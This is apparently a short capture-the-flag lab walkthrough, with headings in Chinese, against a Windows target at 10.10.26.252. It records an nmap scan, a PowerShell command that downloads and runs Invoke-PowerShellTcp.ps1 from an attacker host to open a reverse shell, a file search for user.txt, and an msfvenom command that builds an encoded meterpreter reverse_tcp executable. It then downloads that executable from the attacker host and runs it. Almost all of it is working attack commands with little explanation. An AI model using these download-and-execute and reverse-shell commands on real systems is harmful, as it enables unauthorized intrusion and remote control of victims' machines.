#服务扫描
─# nmap -sT -Pn 10.10.26.252
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 05:52 EDT
Nmap scan report for 10.10.26.252
Host is up (0.32s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 19.05 seconds


#上传一个shell，并且获得一个反弹shell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.21.169:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.21.169 -Port 4443


#查找user.txt文件
Get-ChildItem -Path C:\ -Recurse -Include user.txt

#升级一个shell，以便在msf里使用
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.21.169 LPORT=4444 -f exe -o shell.exe

#在反弹shell里面下载上面的文件
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.21.169:8000/shell.exe','shell.exe')"


#执行shell
Start-Process "shell.exe"